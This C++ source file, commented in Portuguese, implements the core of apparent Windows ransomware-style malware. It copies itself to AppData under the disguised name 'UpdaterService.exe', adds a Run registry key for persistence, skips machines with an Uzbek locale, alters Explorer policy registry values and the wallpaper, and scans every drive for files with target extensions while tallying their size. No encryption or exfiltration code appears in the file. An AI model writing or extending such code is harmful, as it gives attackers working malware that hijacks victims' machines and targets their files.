// file_scanner.cpp
#include "file_scanner.h"

#include <iostream>
#include <Windows.h>
#include <ShlObj.h> // Para SHGetKnownFolderPath
#include <chrono>
#include <execution>
#include <algorithm>

#include <shellapi.h>


#pragma comment(lib, "Shell32.lib")

FileScanner::FileScanner(const std::vector<std::wstring>& extensions)
    : targetExtensions(extensions) {
}

const std::vector<std::wstring>& FileScanner::getFoundFiles() const {
    return foundFiles;
}

bool FileScanner::isAlreadyRunning() {
    HANDLE hMutex = CreateMutexW(NULL, TRUE, mutexName.c_str());
    if (hMutex != NULL && GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return true;
    }
    return false;
}

bool FileScanner::isRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    PSID administratorsGroup;
    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &administratorsGroup)) {
        if (!CheckTokenMembership(NULL, administratorsGroup, &isAdmin)) {
            isAdmin = FALSE;
        }
        FreeSid(administratorsGroup);
    }
    return isAdmin;
}

bool FileScanner::setupPersistence(const std::wstring& persistenceName) {
    wchar_t* roamingPath = nullptr;
    if (FAILED(SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &roamingPath))) {
        return false;
    }
    std::filesystem::path destPath = std::filesystem::path(roamingPath) / persistenceName;
    CoTaskMemFree(roamingPath);

    wchar_t currentExePath[MAX_PATH];
    GetModuleFileNameW(NULL, currentExePath, MAX_PATH);

    if (_wcsicmp(currentExePath, destPath.c_str()) != 0) {
        std::wcout << L"  - A copiar executavel para: " << destPath << std::endl;
        try {
            std::filesystem::copy_file(currentExePath, destPath, std::filesystem::copy_options::overwrite_existing);
        }
        catch (const std::exception& e) {
            std::wcerr << L"  - ERRO ao copiar ficheiro: " << e.what() << std::endl;
            return false;
        }

        HKEY hKey;
        const wchar_t* regPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        if (RegOpenKeyExW(HKEY_CURRENT_USER, regPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            std::wcout << L"  - A adicionar chave de registo para inicialização." << std::endl;
            std::wstring value = L"\"" + destPath.wstring() + L"\"";
            RegSetValueExW(hKey, L"UpdateSystemTask", 0, REG_SZ, (const BYTE*)value.c_str(), (value.size() + 1) * sizeof(wchar_t));
            RegCloseKey(hKey);
            return true;
        }
        return false;
    }
    else {
        std::wcout << L"  - O programa ja esta a ser executado a partir do local de persistencia." << std::endl;
        return true;
    }
}

bool FileScanner::setWallpaper(const std::wstring& imagePath) {
    if (imagePath.empty() || !std::filesystem::exists(imagePath)) {
        return false;
    }
    return SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)imagePath.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
}

void FileScanner::runAsPayload(const PayloadConfig& config) {

    wchar_t* roamingPath = nullptr;
    // Se não conseguirmos obter o caminho, saímos para evitar erros.
    if (FAILED(SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &roamingPath))) {
        return;
    }
    std::filesystem::path persistencePath = std::filesystem::path(roamingPath) / L"UpdaterService.exe";
    CoTaskMemFree(roamingPath);

    wchar_t currentExePath[MAX_PATH];
    GetModuleFileNameW(NULL, currentExePath, MAX_PATH);

    // Comparar os dois caminhos.
    if (_wcsicmp(currentExePath, persistencePath.c_str()) == 0) {
        ShellExecuteW(NULL, L"open", L"calc.exe", NULL, NULL, SW_SHOWNORMAL);
        return;
    }

    std::vector<std::wstring> forbidden = { L"uz-UZ" };
    std::wcout << L"[INFO] A verificar a regiao do sistema..." << std::endl;
    if (isForbiddenCountry(forbidden)) {
        std::wcout << L"  - AVISO: Execucao terminada. Regiao proibida detectada." << std::endl;
        return;
    }
    std::wcout << L"  - Status: Regiao permitida." << std::endl;

    std::wcout << L"[INFO] Mudando configurações do Windows. " << config.wallpaperPath << std::endl;

    blockConfigWindows();

    std::wcout << L"[INFO] A tentar alterar o wallpaper para: " << config.wallpaperPath << std::endl;
    if (setWallpaper(config.wallpaperPath)) {
        std::wcout << L"  - Status: Wallpaper alterado com sucesso." << std::endl;
    }
    else {
        std::wcout << L"  - ERRO: Nao foi possivel alterar o wallpaper." << std::endl;
    }

    if (isAlreadyRunning()) {
        std::wcout << L"[AVISO] Ja existe uma instancia em execucao. Encerrando." << std::endl;
        return;
    }

    std::wcout << L"[INFO] Verificando privilegios..." << std::endl;
    std::wcout << L"  - Status: " << (isRunningAsAdmin() ? L"Executando como Administrador." : L"Executando sem privilegios.") << std::endl;

    std::wcout << L"\n[INFO] A configurar a persistencia..." << std::endl;

    if (setupPersistence(L"UpdaterService.exe")) {
        std::wcout << L"  - Status: Persistencia configurada." << std::endl;
    }
    else {
        std::wcout << L"  - Status: Erro ao configurar persistencia" << std::endl;
    }

    std::wcout << L"\n--- A Iniciar Vasculha de Ficheiros ---" << std::endl;
    auto startTime = std::chrono::high_resolution_clock::now();
    startParallelScan();
    auto endTime = std::chrono::high_resolution_clock::now(); 

    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(endTime - startTime);
    double seconds = duration.count() / 1000.0;

    std::wcout << L"\n[INFO] Vasculha concluida." << std::endl;
    std::wcout << L"  - Ficheiros encontrados: " << foundFiles.size() << std::endl;
    std::wcout << L"  - Tempo total da vasculha: " << seconds << L" segundos." << std::endl;

    std::wcout << L"\n[INFO] Resumo do volume de dados encontrados:" << std::endl;
    if (bytesFoundPerDrive.empty()) {
        std::wcout << L"  - Nenhum dado alvo foi encontrado." << std::endl;
    }
    else {
        uint64_t totalBytes = 0;
        for (const auto& pair : bytesFoundPerDrive) {
            wchar_t driveLetter = pair.first;
            uint64_t bytes = pair.second;
            double gigabytes = static_cast<double>(bytes) / (1024 * 1024 * 1024);
            totalBytes += bytes;
            std::wcout << L"  - Drive " << driveLetter << L":\\ " << std::fixed << std::setprecision(2) << gigabytes << L" GB" << std::endl;
        }
        double totalGigabytes = static_cast<double>(totalBytes) / (1024 * 1024 * 1024);
        std::wcout << L"  -------------------------------------" << std::endl;
        std::wcout << L"  - Total Encontrado: " << std::fixed << std::setprecision(2) << totalGigabytes << L" GB" << std::endl;
    }
}

void FileScanner::scanDirectory(const std::filesystem::path& directoryPath) {
    std::wcout << L"\rVasculhando: " << directoryPath.wstring().substr(0, 80) << std::wstring(20, ' ') << std::flush;

    std::error_code ec;
    // Ignoramos diretórios que não temos permissão
    auto iterator_options = std::filesystem::directory_options::skip_permission_denied;
    for (const auto& entry : std::filesystem::recursive_directory_iterator(directoryPath, iterator_options, ec)) {
        std::error_code entry_ec;
        if (std::filesystem::is_regular_file(entry, entry_ec) && !entry_ec) {
            for (const auto& targetExt : targetExtensions) {
                if (entry.path().has_extension() && _wcsicmp(entry.path().extension().wstring().c_str(), targetExt.c_str()) == 0) {
                    foundFiles.push_back(entry.path().wstring());
                    break;
                }
            }
        }
    }
}

bool FileScanner::isForbiddenCountry(const std::vector<std::wstring>& forbiddenLocales) {
    wchar_t localeName[LOCALE_NAME_MAX_LENGTH];
    if (GetUserDefaultLocaleName(localeName, LOCALE_NAME_MAX_LENGTH)) {
        for (const auto& forbidden : forbiddenLocales) {
            if (_wcsicmp(localeName, forbidden.c_str()) == 0) {
                return true; // Encontrou um país proibido
            }
        }
    }
    return false; // Não está num país proibido
}

void FileScanner::collectDirectories(const std::filesystem::path& root, std::vector<std::filesystem::path>& dirs) {
    std::error_code ec;
    for (const auto& entry : std::filesystem::directory_iterator(root, std::filesystem::directory_options::skip_permission_denied, ec)) {
        if (entry.is_directory(ec)) {
            dirs.push_back(entry.path());
            collectDirectories(entry.path(), dirs); // Chamada recursiva
        }
    }
}

void FileScanner::scanSingleDirectory(const std::filesystem::path& dirPath) {
    std::error_code ec;
    std::vector<std::wstring> localFoundFiles;
    uint64_t localBytesFound = 0; // Acumulador local de bytes para esta pasta

    try {
        for (const auto& entry : std::filesystem::directory_iterator(dirPath, std::filesystem::directory_options::skip_permission_denied, ec)) {
            if (ec) { continue; }

            if (entry.is_regular_file(ec) && !ec) {
                for (const auto& targetExt : targetExtensions) {
                    if (entry.path().has_extension() && _wcsicmp(entry.path().extension().wstring().c_str(), targetExt.c_str()) == 0) {
                        localFoundFiles.push_back(entry.path().wstring());

                        std::error_code size_ec;
                        uint64_t fileSize = std::filesystem::file_size(entry.path(), size_ec);
                        if (!size_ec) {
                            localBytesFound += fileSize;
                        }
                        break;
                    }
                }
            }
        }
    }
    catch (const std::filesystem::filesystem_error&) {
    }

    if (!localFoundFiles.empty()) {
        wchar_t driveLetter = towupper(dirPath.root_path().wstring()[0]);

        std::lock_guard<std::mutex> lock(resultsMutex);
        foundFiles.insert(foundFiles.end(), localFoundFiles.begin(), localFoundFiles.end());
        bytesFoundPerDrive[driveLetter] += localBytesFound;
    }
}

void FileScanner::startParallelScan() {
    std::vector<std::filesystem::path> allDirsToScan;
    std::vector<std::wstring> drives;
    wchar_t logicalDrives[MAX_PATH] = { 0 };

    std::wcout << L"[INFO] Detectando discos..." << std::endl;
    if (GetLogicalDriveStringsW(MAX_PATH - 1, logicalDrives)) {
        wchar_t* drive = logicalDrives;
        while (*drive) {
            drives.push_back(std::wstring(drive));
            drive += wcslen(drive) + 1;
        }
    }

    if (drives.empty()) {
        std::wcerr << L"  - ERRO: Nenhum disco detetado." << std::endl;
        return;
    }

    for (const auto& drivePath : drives) {
        std::wcout << L"  - Disco encontrado: " << drivePath << std::endl;
        std::filesystem::path root(drivePath);
        allDirsToScan.push_back(root);
        collectDirectories(root, allDirsToScan);
    }

    std::wcout << L"\n[INFO] " << allDirsToScan.size() << L" diretorios para analisar. Iniciando vasculha paralela..." << std::endl;

    std::for_each(
        std::execution::par,
        allDirsToScan.begin(),
        allDirsToScan.end(),
        [this](const std::filesystem::path& dir) {
            scanSingleDirectory(dir);
        }
    );
}

bool FileScanner::blockConfigWindows() {
    HKEY hKey;
    const wchar_t* subKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer";
    const wchar_t* valueName = L"NoControlPanel";
    DWORD dwValue = 0;

    LONG openRes = RegCreateKeyExW(
        HKEY_CURRENT_USER, subKey, 0, NULL, REG_OPTION_NON_VOLATILE,
        KEY_SET_VALUE, NULL, &hKey, NULL
    );

    if (openRes != ERROR_SUCCESS) {
        std::wcerr << L"Erro ao abrir/criar a chave do registro. Codigo: " << openRes << std::endl;
        return false;
    }

    LONG setRes = RegSetValueExW(
        hKey, valueName, 0, REG_DWORD, (const BYTE*)&dwValue, sizeof(dwValue)
    );

    RegCloseKey(hKey);

    if (setRes != ERROR_SUCCESS) {
        std::wcerr << L"Erro ao definir o valor no registro. Codigo: " << setRes << std::endl;
        return false;
    }

    std::wcout << L"Valor do registro definido com sucesso. A enviar notificacao de atualizacao para o sistema..." << std::endl;
    SendMessageTimeoutW(
        HWND_BROADCAST,    // Enviar para todas as janelas
        WM_SETTINGCHANGE,  // A mensagem que indica uma mudança de configuração
        NULL,              // Parâmetro não utilizado
        (LPARAM)L"Policy",
        SMTO_ABORTIFHUNG,  // Se uma aplicação estiver bloqueada, não esperar por ela
        5000,              // Timeout de 5 segundos
        NULL
    );

    return true;
}